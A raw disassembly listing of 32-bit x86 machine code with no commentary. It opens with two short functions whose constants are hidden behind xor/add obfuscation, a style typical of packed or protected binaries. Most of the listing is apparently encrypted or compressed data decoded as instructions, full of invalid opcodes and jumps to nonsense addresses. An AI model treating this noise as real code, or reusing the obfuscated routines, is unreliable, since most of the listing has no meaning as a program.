  42050e:	mov    eax,DWORD PTR [esp+0x10]
  420512:	push   DWORD PTR [esp+0xc]
  420516:	xor    eax,edi
  420518:	add    eax,esi
  42051a:	mov    DWORD PTR [esp+0x20],eax
  42051e:	lea    eax,[esp+0x20]
  420522:	push   eax
  420523:	push   ebx
  420524:	push   DWORD PTR [esp+0x20]
  420528:	push   DWORD PTR [esp+0x28]
  42052c:	push   DWORD PTR [esp+0x24]
  420530:	call   0x41fef5
  420535:	mov    eax,DWORD PTR [esp+0x10]
  420539:	mov    ecx,DWORD PTR [ebx]
  42053b:	xor    eax,edi
  42053d:	add    eax,esi
  42053f:	cmp    ecx,eax
  420541:	je     0x42059f
  420543:	mov    eax,DWORD PTR [esp+0x18]
  420547:	mov    ecx,DWORD PTR [esp+0x14]
  42054b:	xor    eax,edi
  42054d:	add    eax,esi
  42054f:	imul   eax,DWORD PTR [esp+0x1c]
  420554:	mov    DWORD PTR [ecx],eax
  420556:	jmp    0x42059f
  420558:	mov    ecx,DWORD PTR [ebp+0x20]
  42055b:	cmp    ecx,0xf89c85b9
  420561:	jne    0x42056a
  420563:	push   0xf89c85b8
  420568:	jmp    0x420588
  42056a:	mov    ecx,DWORD PTR [ebp+0x20]
  42056d:	cmp    ecx,0xf89c85b8
  420573:	jne    0x42057c
  420575:	push   0xf89c85bf
  42057a:	jmp    0x420588
  42057c:	mov    ecx,DWORD PTR [ebp+0x20]
  42057f:	cmp    ecx,0xf89c85bf
  420585:	jne    0x42059f
  420587:	push   eax
  420588:	push   DWORD PTR [ebp+0x1c]
  42058b:	push   DWORD PTR [ebp+0x18]
  42058e:	push   ebx
  42058f:	push   DWORD PTR [ebp+0x10]
  420592:	push   DWORD PTR [ebp+0xc]
  420595:	push   DWORD PTR [ebp+0x8]
  420598:	call   0x420433
  42059d:	mov    DWORD PTR [ebx],eax
  42059f:	mov    eax,DWORD PTR [ebx]
  4205a1:	pop    edi
  4205a2:	pop    esi
  4205a3:	pop    ebx
  4205a4:	mov    esp,ebp
  4205a6:	pop    ebp
  4205a7:	ret    0x1c
  4205aa:	push   ebp
  4205ab:	mov    ebp,esp
  4205ad:	sub    esp,0xc
  4205b0:	mov    eax,0xf89c8585
  4205b5:	mov    DWORD PTR [ebp-0x8],eax
  4205b8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4205bf:	mov    ecx,DWORD PTR [ebp-0x8]
  4205c2:	xor    ecx,0x751089b
  4205c8:	add    ecx,0x3272e2
  4205ce:	mov    DWORD PTR [ebp-0x4],ecx
  4205d1:	mov    ecx,DWORD PTR [ebp+0xc]
  4205d4:	push   eax
  4205d5:	mov    DWORD PTR [ebp+0xc],ecx
  4205d8:	push   DWORD PTR [ebp+0xc]
  4205db:	lea    eax,[ebp-0x4]
  4205de:	push   DWORD PTR [ebp+0x8]
  4205e1:	push   eax
  4205e2:	push   DWORD PTR [ebp+0xc]
  4205e5:	push   DWORD PTR [ebp-0xc]
  4205e8:	push   DWORD PTR [ebp-0x8]
  4205eb:	call   0x420433
  4205f0:	mov    DWORD PTR [ebp-0x4],eax
  4205f3:	mov    eax,DWORD PTR [ebp-0x4]
  4205f6:	leave  
  4205f7:	ret    0x8
  4205fa:	jg     0x4205b0
  4205fc:	jge    0xf741c5d1
  420602:	add    ebp,DWORD PTR [eax-0xa]
  420605:	data16 cli 
  420607:	jbe    0x4205fa
  420609:	retf   0x8308
  42060c:	add    DWORD PTR [eax],eax
  42060e:	sti    
  42060f:	add    DWORD PTR [eax],eax
  420611:	add    BYTE PTR [esi+0x677ec78a],dl
  420617:	fiadd  WORD PTR [edx-0x2348314d]
  42061d:	xor    DWORD PTR ds:0xfcdc9435,edi
  420623:	fdiv   QWORD PTR [esi+0x29]
  420626:	add    DWORD PTR [esi+0x53c30fd7],esp
  42062c:	sti    
  42062d:	call   0x36b4:0x1c97ac82
  420634:	lods   al,BYTE PTR ds:[esi]
  420635:	xchg   ebp,eax
  420636:	pusha  
  420637:	sti    
  420638:	xchg   esi,eax
  420639:	into   
  42063a:	jge    0x420638
  42063c:	push   ds
  42063d:	or     edi,DWORD PTR [edi]
  42063f:	and    DWORD PTR [esi+0x4caf5948],eax
  420645:	outs   dx,BYTE PTR ds:[esi]
  420646:	je     0x4206b2
  420648:	cli    
  420649:	in     al,0xe2
  42064b:	dec    ebx
  42064c:	add    eax,0x1db3903d
  420651:	lahf   
  420652:	sub    bh,BYTE PTR [eax+0x1a]
  420655:	shr    ch,1
  420657:	jl     0x42062d
  420659:	push   cs
  42065a:	mov    ecx,0xd7d00061
  42065f:	mov    ecx,0xae415664
  420664:	pop    es
  420665:	push   0x8c8feacc
  42066a:	jmp    0xa432:0x4290f169
  420671:	sbb    eax,0x13916ec4
  420676:	jecxz  0x42065b
  420678:	popa   
  420679:	mov    edi,0xf55eee1a
  42067e:	(bad)  
  42067f:	out    0x42,al
  420681:	lods   al,BYTE PTR ds:[esi]
  420682:	gs mov ecx,0x7a0a2ba2
  420688:	mov    WORD PTR [esi-0x10],ss
  42068b:	cwde   
  42068c:	inc    BYTE PTR ds:0x2de3feed
  420692:	pop    ecx
  420693:	xor    BYTE PTR [edi+0x1137d387],ch
  420699:	xlat   BYTE PTR ds:[ebx]
  42069a:	mov    esp,DWORD PTR [ecx+ebx*4]
  42069d:	loope  0x420637
  42069f:	mov    eax,0x941f452b
  4206a4:	xchg   esp,eax
  4206a5:	loope  0x4206cb
  4206a7:	ret    0xf083
  4206aa:	sub    al,0xfe
  4206ac:	sub    BYTE PTR [ebx-0x493d484],bl
  4206b2:	xchg   ecx,eax
  4206b3:	ror    DWORD PTR [ebp-0x1be6f31],cl
  4206b9:	sar    bl,0xbc
  4206bc:	sbb    DWORD PTR [ebp-0x545d9532],ebp
  4206c2:	pusha  
  4206c3:	pop    esi
  4206c4:	ins    DWORD PTR es:[edi],dx
  4206c5:	pop    esi
  4206c6:	not    bh
  4206c8:	cs aad 0x4a
  4206cb:	xchg   edx,eax
  4206cc:	outs   dx,DWORD PTR ds:[esi]
  4206cd:	lods   al,BYTE PTR ds:[esi]
  4206ce:	inc    esp
  4206cf:	push   ebx
  4206d0:	adc    esp,esi
  4206d2:	xchg   BYTE PTR [eax-0x3f],bh
  4206d5:	or     DWORD PTR [edi-0x6ad92547],esi
  4206db:	sti    
  4206dc:	or     al,0x5b
  4206de:	mov    ebx,0xbbe9350f
  4206e3:	cs je  0x42073c
  4206e6:	pusha  
  4206e7:	das    
  4206e8:	lds    edx,FWORD PTR [ebx+0x2d0cbb4d]
  4206ee:	imul   ecx,DWORD PTR [ecx-0x53],0x60
  4206f2:	add    eax,0x7800fd00
  4206f7:	pop    ecx
  4206f8:	mov    ecx,0x66cb94d1
  4206fd:	cmp    al,0x39
  4206ff:	cdq    
  420700:	jae    0x420766
  420702:	pop    ecx
  420703:	mov    ebp,0xf9a00dd7
  420708:	mov    ds:0xb2bc3d19,eax
  42070d:	loop   0x4206a6
  42070f:	in     al,dx
  420710:	out    0xb8,eax
  420712:	and    DWORD PTR [ebx],0xffffff8c
  420715:	dec    esi
  420716:	sti    
  420717:	mov    edi,0xbea49385
  42071c:	loop   0x420720
  42071e:	nop
  42071f:	inc    edx
  420720:	cwde   
  420721:	lock arpl WORD PTR [eax],sp
  420724:	rcr    BYTE PTR [edx],cl
  420726:	iret   
  420727:	not    DWORD PTR [ecx+0x5eec4259]
  42072d:	jl     0x42079b
  42072f:	int    0x4
  420731:	add    ch,ch
  420733:	xor    eax,0x226b850b
  420738:	xlat   BYTE PTR ds:[ebx]
  420739:	lods   eax,DWORD PTR ds:[esi]
  42073a:	and    bl,0x9a
  42073d:	dec    BYTE PTR [edx]
  42073f:	fs aad 0xfc
  420742:	clc    
  420743:	mov    ah,0x19
  420745:	pop    ss
  420746:	ret    0x6ff0
  420749:	push   edi
  42074a:	xchg   edx,eax
  42074b:	or     al,BYTE PTR [esi+ecx*4-0x317f3adf]
  420752:	mov    WORD PTR [eax],fs
  420754:	stos   BYTE PTR es:[edi],al
  420755:	and    bh,BYTE PTR [edx+0x62]
  420758:	test   BYTE PTR [edi-0x1f],0x24
  42075c:	outs   dx,DWORD PTR ds:[esi]
  42075d:	jp     0x420757
  42075f:	sti    
  420760:	seto   dh
  420763:	test   al,0xfd
  420765:	fidiv  WORD PTR [edx+0x1046b3e3]
  42076b:	pop    edx
  42076c:	(bad)  
  42076d:	arpl   WORD PTR [eax],bp
  42076f:	lock and eax,0x15e04b2b
  420775:	push   ebx
  420776:	mov    esi,0xb7605fd6
  42077b:	rcr    BYTE PTR [ecx],cl
  42077d:	not    BYTE PTR [ebx]
  42077f:	push   esp
  420780:	mov    esi,0xa37e4aff
  420785:	or     al,0x54
  420787:	push   cs
  420788:	(bad)  
  420789:	xchg   edi,eax
  42078a:	jne    0x420728
  42078c:	sbb    BYTE PTR [ecx],0xf0
  42078f:	icebp  
  420790:	jge    0x42076b
  420792:	dec    eax
  420793:	mov    ecx,0x465080bc
  420798:	das    
  420799:	sub    al,0xd7
  42079b:	jg     0x420759
  42079d:	fwait
  42079e:	pushf  
  42079f:	pushf  
  4207a0:	aad    0x6c
  4207a2:	mov    esi,0xdcf3a79a
  4207a7:	das    
  4207a8:	add    DWORD PTR [ebp+0x4f],edi
  4207ab:	inc    edx
  4207ac:	cs fdivr st,st(5)
  4207af:	pop    edi
  4207b0:	std    
  4207b1:	out    dx,al
  4207b2:	xor    edi,ebx
  4207b4:	inc    edx
  4207b5:	jmp    0x3732208a
  4207ba:	enter  0x4f6a,0xcd
  4207be:	fwait
  4207bf:	cli    
  4207c0:	dec    edx
  4207c1:	ss mov ecx,0x6abdd657
  4207c7:	or     cl,BYTE PTR [ecx+0xf9d33d7]
  4207cd:	stos   DWORD PTR es:[edi],eax
  4207ce:	ror    BYTE PTR [esp+ebp*8],0xba
  4207d2:	xchg   esi,eax
  4207d3:	lea    ebp,[ecx-0x6de1a79]
  4207d9:	dec    ebp
  4207da:	cld    
  4207db:	push   ebp
  4207dc:	pop    esi
  4207dd:	outs   dx,DWORD PTR ds:[esi]
  4207de:	fs iret 
  4207e0:	std    
  4207e1:	je     0x4207e8
  4207e3:	fimul  DWORD PTR [edx]
  4207e5:	les    eax,FWORD PTR [edx+0x2d]
  4207e8:	lds    esi,FWORD PTR ds:0xdb049ea9
  4207ee:	push   ebp
  4207ef:	fwait
  4207f0:	xchg   esp,eax
  4207f1:	(bad)  
  4207f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207f3:	jb     0x4207dd
  4207f5:	mov    ecx,0xbd2f43f7
  4207fa:	cmp    al,0xce
  4207fc:	repnz or BYTE PTR [ebp+0x1bc1dfa3],dh
  420803:	push   ecx
  420804:	push   edx
  420805:	push   ebp
  420806:	shr    DWORD PTR [edi+0x2ee7a7fc],0x5
	...
  420819:	add    BYTE PTR [edi+0x4c],dh
  42081c:	idiv   dh
  42081e:	(bad)  
  42081f:	(bad)  
  420820:	jg     0x4207ef
  420822:	mul    BYTE PTR [ebx-0x7931d003]
  420828:	push   0x4
  42082a:	add    eax,DWORD PTR [ebp+0x1fb0001]
  420830:	add    BYTE PTR [eax],al
  420832:	clc    
  420833:	into   
  420834:	loop   0x4207e6
  420836:	dec    edx
  420837:	into   
  420838:	stos   BYTE PTR es:[edi],al
  420839:	and    eax,0x6a605e58
  42083e:	or     ebp,DWORD PTR [ecx]
  420840:	jmp    0xb8df:0xd5ab4c0a
  420847:	out    dx,al
  420848:	jae    0x42085b
  42084a:	or     BYTE PTR [esi-0x170d4e4c],al
  420850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420851:	jbe    0x4208ae
  420853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420854:	push   ebp
  420855:	adc    BYTE PTR [eax],bl
  420857:	or     DWORD PTR [ebp+0x38f12daa],esp
  42085d:	add    eax,ebp
  42085f:	(bad)  
  420860:	in     eax,0x7
  420862:	pop    ss
  420863:	xchg   dh,dh
  420865:	ret    0x9d18
  420868:	sub    al,0x5a
  42086a:	(bad)  
  42086b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42086c:	pop    ds
  42086d:	xor    eax,DWORD PTR [ebx-0x45]
  420870:	xor    al,ah
  420872:	(bad)  
  420873:	ror    eax,1
  420875:	push   ebx
  420876:	call   0x2cad:0xd505fce6
  42087d:	pop    edi
  42087e:	xor    DWORD PTR [eax],eax
  420880:	int    0x65
  420882:	xor    eax,0xdce93651
  420887:	pop    edx
  420888:	in     eax,0x7c
  42088a:	mov    eax,ds:0x60043e87
  42088f:	inc    ebx
  420890:	jecxz  0x4208c6
  420892:	mov    ds:0x4363f925,eax
  420897:	mov    edi,0x4d6ba88d
  42089c:	and    ah,BYTE PTR [edi+edx*8+0x5c]
  4208a0:	clc    
  4208a1:	(bad)  
  4208a2:	sub    eax,0x7bccd070
  4208a7:	pop    eax
  4208a8:	sahf   
  4208a9:	pop    esi
  4208aa:	cmc    
  4208ab:	pop    ds
  4208ac:	idiv   DWORD PTR [edx+edx*2-0x2f181d8c]
  4208b3:	and    DWORD PTR [ecx+0x46],ebp
  4208b6:	mov    esi,DWORD PTR [edi+0x3131c32e]
  4208bc:	loope  0x420899
  4208be:	mov    ebx,0x9fee658c
  4208c3:	jl     0x42088c
  4208c5:	and    DWORD PTR [ebx+eax*2-0x12],edi
  4208c9:	adc    eax,0xab89eba3
  4208ce:	inc    ebp
  4208cf:	mov    esp,0xa315f634
  4208d4:	imul   esp,DWORD PTR [ebp+0x7d65ef95],0x57731578
  4208de:	sub    ch,BYTE PTR [esi]
  4208e0:	dec    ebp
  4208e1:	and    BYTE PTR ds:0xcc7c3928,al
  4208e7:	cmp    al,0x13
  4208e9:	mov    cs,WORD PTR [ecx+0x2a63cb2d]
  4208ef:	in     al,dx
  4208f0:	push   edi
  4208f1:	mov    ds:0x46490c84,al
  4208f6:	xchg   ebx,eax
  4208f7:	bound  eax,QWORD PTR [ebx]
  4208f9:	inc    ebx
  4208fa:	inc    esi
  4208fb:	bound  eax,QWORD PTR [ebp-0xd28b44e]
  420901:	mov    ecx,0x783b3356
  420906:	inc    edi
  420907:	dec    eax
  420908:	inc    ebp
  420909:	jge    0x4208d7
  42090b:	pop    esp
  42090c:	cmp    esp,DWORD PTR [ecx-0x59463646]
  420912:	mov    dh,0x97
  420914:	or     DWORD PTR [ecx+0x62],ebp
  420917:	mov    ebp,0xb6ffc990
  42091c:	dec    edx
  42091d:	scas   eax,DWORD PTR es:[edi]
  42091e:	stos   BYTE PTR es:[edi],al
  42091f:	(bad)  
  420920:	das    
  420921:	mov    ds:0xe1ad02fc,eax
  420926:	push   ebx
  420927:	je     0x42099d
  420929:	inc    ebx
  42092a:	push   ebp
  42092b:	stos   DWORD PTR es:[edi],eax
  42092c:	sbb    cl,bh
  42092e:	push   ebx
  42092f:	xchg   ebp,eax
  420930:	adc    DWORD PTR gs:[esp+esi*2-0x22d4f76a],0xfffffff3
  420939:	jno    0x4208db
  42093b:	ja     0x420968
  42093d:	inc    sp
  42093f:	les    esi,FWORD PTR [ebp-0x417ddfa0]
  420945:	xchg   edx,eax
  420946:	push   ebp
  420947:	pop    ecx
  420948:	arpl   WORD PTR [esi],si
  42094a:	popa   
  42094b:	into   
  42094c:	mov    dl,0x60
  42094e:	push   es
  42094f:	retf   
  420950:	cmc    
  420951:	push   ecx
  420952:	add    al,0xb0
  420954:	mov    eax,0xc8fae0d6
  420959:	mov    edi,0xf629e0d8
  42095e:	(bad)  
  42095f:	popa   
  420960:	sbb    eax,0xb6562e36
  420965:	mov    esi,0x49c250b4
  42096a:	mov    DWORD PTR [edi-0x5bd03014],ecx
  420970:	sbb    al,0xbf
  420972:	lds    esp,FWORD PTR [eax-0x6c79d7e5]
  420978:	fild   WORD PTR [ebp-0x5d]
  42097b:	mov    edx,0x587a7ae3
  420980:	sub    ecx,DWORD PTR [edx+edx*1]
  420983:	push   eax
  420984:	clc    
  420985:	mov    al,ds:0x98339ff1
  42098a:	push   ecx
  42098b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42098c:	mov    ?,WORD PTR [edi-0x58]
  42098f:	xor    bl,0x33
  420992:	xchg   edi,eax
  420993:	ret    0xaf92
  420996:	pop    edx
  420997:	jle    0x420a0a
  420999:	dec    ecx
  42099a:	je     0x4209d1
  42099c:	dec    ebp
  42099d:	lahf   
  42099e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42099f:	pop    eax
  4209a0:	mov    ds:0xe5bea6c0,eax
  4209a5:	loope  0x420951
  4209a7:	leave  
  4209a8:	mov    ecx,0x7a9b64f
  4209ad:	xchg   ebp,eax
  4209ae:	mov    ds:0x66a5d917,al
  4209b3:	and    dh,BYTE PTR [edi-0x77]
  4209b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209b7:	adc    edx,DWORD PTR [eax-0x309ca7ba]
  4209bd:	stc    
  4209be:	xchg   edi,eax
  4209bf:	cmp    BYTE PTR [ecx-0x73adbfff],bh
  4209c5:	dec    ecx
  4209c6:	into   
  4209c7:	mov    eax,DWORD PTR ds:0x39900167
  4209cd:	xor    al,0x4c
  4209cf:	ds jbe 0x4209da
  4209d2:	jmp    0x6c6a55a6
  4209d7:	or     ebp,edi
  4209d9:	out    0x28,al
  4209db:	stc    
  4209dc:	loop   0x4209b2
  4209de:	and    ecx,DWORD PTR [edx+0x7a33390e]
  4209e4:	pslld  mm1,mm0
  4209e7:	into   
  4209e8:	icebp  
  4209e9:	push   ebx
  4209ea:	push   0xffffff95
  4209ec:	(bad)  
  4209ed:	push   ebp
  4209ee:	cs jae 0x4209be
  4209f1:	jo     0x420a64
  4209f3:	call   0xc4c6:0xa48b5d84
  4209fa:	fidiv  DWORD PTR [ecx-0x148a563b]
  420a00:	je     0x420a73
  420a02:	dec    ecx
  420a03:	inc    esi
  420a04:	and    ebx,eax
  420a06:	ins    DWORD PTR es:[edi],dx
  420a07:	dec    ebx
  420a08:	xor    eax,ecx
  420a0a:	jo     0x420a87
  420a0c:	sub    bl,BYTE PTR [esi]
  420a0e:	iret   
  420a0f:	adc    esp,esp
  420a11:	aad    0x38
  420a13:	ss inc esi
  420a15:	mov    ebx,0xe79b0b3
  420a1a:	ss (bad) 
  420a1c:	mov    ds:0x7390ec1d,al
  420a21:	stos   BYTE PTR es:[edi],al
  420a22:	arpl   WORD PTR [ebx+edi*2-0x162f4b6],bp
  420a29:	in     al,dx
  420a2a:	or     ah,ch
  420a2c:	aas    
	...
  420a39:	add    BYTE PTR [edi],al
  420a3b:	sbb    cl,BYTE PTR [ecx-0x686462e6]
  420a41:	pop    ds
  420a42:	(bad)  
  420a44:	std    
  420a45:	jg     0x420aab
  420a47:	rol    BYTE PTR [ebp-0x45],0xfe
  420a4b:	xchg   BYTE PTR [ecx],al
  420a4d:	add    bl,bh
  420a4f:	add    DWORD PTR [eax],eax
  420a51:	add    BYTE PTR [ecx-0x10],al
  420a54:	inc    ecx
  420a55:	sbb    BYTE PTR [edx+0x1e],bh
  420a58:	cmp    esi,DWORD PTR [esi]
  420a5a:	add    ah,cl
  420a5c:	adc    dh,ch
  420a5e:	retf   
  420a5f:	add    esp,DWORD PTR [edx-0x2687b5be]
  420a65:	dec    eax
  420a66:	jne    0x420aa7
  420a68:	icebp  
  420a69:	aaa    
  420a6a:	add    cl,0x7c
  420a6d:	dec    eax
  420a6e:	jg     0x420a95
  420a70:	pop    eax
  420a71:	push   es
  420a72:	lahf   
  420a73:	xchg   ebp,eax
  420a74:	adc    eax,0x385558dd
  420a79:	or     eax,0x45bd57cc
  420a7e:	adc    al,0x13
  420a80:	(bad)  
  420a82:	test   edx,edi
  420a84:	mov    edx,0xce5b17e
  420a89:	push   ss
  420a8a:	(bad)  
  420a8c:	mov    WORD PTR ds:0xc87c7a5,es
  420a92:	push   cs
  420a93:	into   
  420a94:	jnp    0x420aff
  420a96:	call   0xe270:0x3faf6d27
  420a9d:	pop    DWORD PTR [edi+0x38]
  420aa0:	fsub   st,st(5)
  420aa2:	out    0x2f,al
  420aa4:	jle    0x420a47
  420aa6:	stos   DWORD PTR es:[edi],eax
  420aa7:	enter  0xb4e8,0xc
  420aab:	ja     0x420a3f
  420aad:	or     bh,dh
  420aaf:	pop    ss
  420ab0:	repz inc edx
  420ab2:	std    
  420ab3:	pop    es
  420ab4:	pop    ebx
  420ab5:	jno    0x420b31
  420ab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ab8:	iret   
  420ab9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420aba:	lea    esp,[edx-0x79c73ede]
  420ac0:	rol    al,0x21
  420ac3:	inc    ebp
  420ac4:	xor    ch,BYTE PTR [ebx]
  420ac6:	mov    BYTE PTR [ecx],dl
  420ac8:	loop   0x420ac6
  420aca:	jge    0x420ab6
  420acc:	stos   BYTE PTR es:[edi],al
  420acd:	and    eax,0x922c520e
  420ad2:	les    eax,FWORD PTR [esi]
  420ad4:	fcomp  DWORD PTR [edx-0x15]
  420ad7:	pop    es
  420ad8:	loop   0x420b3b
  420ada:	ins    BYTE PTR es:[edi],dx
  420adb:	jnp    0x420a7a
  420add:	fprem1 
  420adf:	xchg   esp,edx
  420ae1:	in     al,0xf9
  420ae3:	sub    BYTE PTR [edi-0x7f],bl
  420ae6:	mov    bl,0xcc
  420ae8:	(bad)  
  420aea:	xchg   esp,eax
  420aeb:	arpl   WORD PTR [eax],di
  420aed:	out    0xff,al
  420aef:	and    ecx,DWORD PTR [esi]
  420af1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420af2:	adc    al,0xed
  420af4:	dec    edi
  420af5:	mov    dh,0x4
  420af7:	mov    al,ds:0x9814c0ac
  420afc:	jmp    0x63953ebc
  420b01:	pop    esp
  420b02:	jb     0x420b64
  420b04:	sub    eax,0x4d23bef8
  420b09:	test   al,0x1
  420b0b:	(bad)  
  420b0c:	int    0x2f
  420b0e:	popa   
  420b0f:	pop    ss
  420b10:	lods   al,BYTE PTR ds:[esi]
  420b11:	cmp    BYTE PTR [ebp-0x68],bl
  420b14:	dec    eax
  420b16:	or     ch,bl
  420b18:	mov    DWORD PTR [ebx+0x56ce39a1],edx
  420b1e:	or     al,0x2c
  420b20:	push   eax
  420b21:	xor    BYTE PTR [edi],ah
  420b23:	or     esp,DWORD PTR [edi+ebp*2-0x23d93eb9]
  420b2a:	push   0x3e
  420b2c:	adc    al,0xc9
  420b2e:	mov    ah,0xa6
  420b30:	mov    ecx,0xe7ad9388
  420b35:	pusha  
  420b36:	mov    BYTE PTR [ebx+0x4d],bh
  420b39:	aam    0x4c
  420b3b:	outs   dx,BYTE PTR ds:[esi]
  420b3c:	mov    dl,0x16
  420b3e:	mov    cs:0xfd2f26a8,al
  420b44:	icebp  
  420b45:	data16 repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b48:	push   esi
  420b49:	mov    bl,0x39
  420b4b:	ss das 
  420b4d:	mov    ch,0xa9
  420b4f:	clc    
  420b50:	pop    ss
  420b51:	cmp    cl,BYTE PTR [ebx-0x39]
  420b54:	add    al,BYTE PTR [ebp+eax*2+0xe1d0e65]
  420b5b:	xchg   ebp,eax
  420b5c:	sar    DWORD PTR ds:0x96801978,cl
  420b62:	inc    eax
  420b63:	adc    ebp,DWORD PTR [edi-0x60]
  420b66:	jmp    0x420bac
  420b68:	ds push ebx
  420b6a:	push   0x3ee1386d
  420b6f:	xchg   ebp,eax
  420b70:	mov    fs,WORD PTR [esi-0x52ab4dd1]
  420b76:	std    
  420b77:	outs   dx,BYTE PTR ds:[esi]
  420b78:	int    0xa3
  420b7a:	pop    ss
  420b7b:	jmp    0x420bf4
  420b7d:	adc    ch,BYTE PTR [edi]
  420b7f:	and    ebp,ecx
  420b81:	outs   dx,BYTE PTR ds:[esi]
  420b82:	ins    BYTE PTR es:[edi],dx
  420b83:	sub    BYTE PTR [edi],ch
  420b85:	fwait
  420b86:	test   DWORD PTR [esi*8-0x2e03e159],0xa81ed093
  420b91:	fmul   QWORD PTR [edx]
  420b93:	pop    edi
  420b94:	push   ds
  420b95:	imul   ebx,DWORD PTR [edx],0xfffffffe
  420b98:	mov    eax,ds:0x43c1f6e2
  420b9d:	jno    0x420bf6
  420b9f:	jle    0x420bd6
  420ba1:	inc    ebx
  420ba2:	sub    edx,DWORD PTR [ebp+0x78]
  420ba5:	and    DWORD PTR [ecx-0x42f761f5],ecx
  420bab:	ret    0x60ce
  420bae:	sti    
  420baf:	mov    ds:0xde9a089d,eax
  420bb4:	mov    ch,0x5a
  420bb6:	iret   
  420bb7:	xchg   DWORD PTR [eax-0x56a17918],edi
  420bbd:	aad    0x98
  420bbf:	or     ecx,DWORD PTR ss:[edi+esi*4-0x5d]
  420bc4:	sbb    ch,BYTE PTR [edx+eax*2+0x3735d252]
  420bcb:	mov    ebx,0xe4eb6d21
  420bd0:	mov    ecx,0xb9e2141d
  420bd5:	in     eax,0x68
  420bd7:	add    ch,dl
  420bd9:	icebp  
  420bda:	mov    ds:0x506e6f55,eax
  420bdf:	call   0x59be:0xdcc66149
  420be6:	push   ebp
  420be7:	loopne 0x420bcb
  420be9:	xchg   edi,eax
  420bea:	push   edx
  420beb:	xchg   esp,eax
  420bec:	in     al,dx
  420bed:	or     eax,0x2db2de73
  420bf2:	dec    eax
  420bf3:	pmaddwd mm3,QWORD PTR [eax-0x2c]
  420bf7:	jb     0x420bf4
  420bf9:	cli    
  420bfa:	and    DWORD PTR [edx+0x2b],esi
  420bfd:	les    esp,FWORD PTR [ebx+esi*8+0x3c]
  420c01:	or     esp,DWORD PTR [esi+ebx*2-0x61b43c59]
  420c08:	out    0x1a,al
  420c0a:	jbe    0x420ba9
  420c0c:	jne    0x420bc8
  420c0e:	mov    DWORD PTR [ebx-0x7ccb0f7b],esp
  420c14:	adc    ebp,DWORD PTR [edx-0x7e]
  420c17:	pop    ebx
  420c18:	outs   dx,BYTE PTR ds:[esi]
  420c19:	mov    edi,0xfe9dcd74
  420c1e:	jecxz  0x420c80
  420c20:	fisub  DWORD PTR [eax-0x75]
  420c23:	mov    BYTE PTR [ecx],cl
  420c25:	out    dx,eax
  420c26:	(bad)  
  420c27:	stos   BYTE PTR es:[edi],al
  420c28:	cmp    esp,DWORD PTR [ebx+0x2ea99d35]
  420c2e:	push   0x24b2c93a
  420c33:	pop    edi
  420c34:	cs push ds
  420c36:	les    edx,FWORD PTR [ecx+0x2f62077]
  420c3c:	mov    ds:0x2dfd0c80,al
  420c41:	imul   esi,DWORD PTR [ecx],0xcecff6ab
  420c47:	push   0xee134a46
  420c4c:	mov    al,0x0
	...
  420c5a:	push   ds
  420c5b:	add    al,0xa7
  420c5d:	(bad)  
  420c5e:	mov    edi,0x7bdd7ee7
  420c63:	int    0x75
  420c65:	mov    esi,?
  420c67:	mov    ebx,0x88f9a625
  420c6c:	add    DWORD PTR [eax],eax
  420c6e:	sti    
  420c6f:	add    DWORD PTR [eax],eax
  420c71:	add    BYTE PTR [ecx],al
  420c73:	jmp    0x420c94
  420c75:	pop    ebx
  420c76:	xchg   edi,eax
  420c77:	jmp    0x8223:0x169ce5d8
  420c7e:	aad    0xfe
  420c80:	xor    esp,DWORD PTR [ebx-0x18593018]
  420c86:	dec    esp
  420c87:	add    bh,BYTE PTR [eax+0x359eca9]
  420c8d:	iret   
  420c8e:	jnp    0x420cb8
  420c90:	mov    dl,0xca
  420c92:	or     edi,DWORD PTR [eax-0x28]
  420c95:	or     dh,dh
  420c97:	in     eax,dx
  420c98:	js     0x420cc7
  420c9a:	cld    
  420c9b:	bound  edx,QWORD PTR [edi+0x61]
  420c9e:	in     al,0xb
  420ca0:	mov    edx,0x66a846ba
  420ca5:	(bad)  
  420ca6:	lock adc ecx,DWORD PTR [edi]
  420ca9:	mov    edx,0x7b212c28
  420cae:	ins    DWORD PTR es:[edi],dx
  420caf:	std    
  420cb0:	jno    0x420cfe
  420cb2:	std    
  420cb3:	jge    0x420cc0
  420cb5:	shl    DWORD PTR [edi-0x133e595a],1
  420cbb:	mov    DWORD PTR [edx],0x1eeba69a
  420cc1:	(bad)  
  420cc2:	push   0x54
  420cc4:	in     al,0xc1
  420cc6:	stc    
  420cc7:	jo     0x420d14
  420cc9:	ins    DWORD PTR es:[edi],dx
  420cca:	dec    edx
  420ccb:	mov    dl,0x1f
  420ccd:	sub    eax,0xe134f8a7
  420cd2:	pushf  
  420cd3:	inc    edi
  420cd4:	push   cs
  420cd5:	push   ebp
  420cd6:	push   esi
  420cd7:	in     eax,0xae
  420cd9:	fiadd  DWORD PTR [edx+0x5143ba97]
  420cdf:	dec    ebx
  420ce0:	gs adc al,0x84
  420ce3:	loopne 0x420cc2
  420ce5:	es lahf 
  420ce7:	imul   ecx,eax,0x7a
  420cea:	xchg   esi,eax
  420ceb:	sub    dl,BYTE PTR [edi+0x516f2d16]
  420cf1:	imul   DWORD PTR [ecx-0x6a4ce6c9]
  420cf7:	jo     0x420d1c
  420cf9:	add    esp,ebx
  420cfb:	pusha  
  420cfc:	iret   
  420cfd:	mov    esi,?
  420cff:	jmp    0x5cf3974a
  420d04:	dec    esp
  420d05:	shl    DWORD PTR [ecx-0x39bbafec],1
  420d0b:	cli    
  420d0c:	std    
  420d0d:	xlat   BYTE PTR ds:[ebx]
  420d0e:	mov    esi,0xf3a0c8b6
  420d13:	lock repz pop edi
  420d16:	pop    esi
  420d17:	adc    ebx,DWORD PTR [eax]
  420d19:	stos   DWORD PTR es:[edi],eax
  420d1a:	dec    esi
  420d1b:	cmp    dh,ch
  420d1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d1e:	adc    BYTE PTR ds:0xefdc8c61,bh
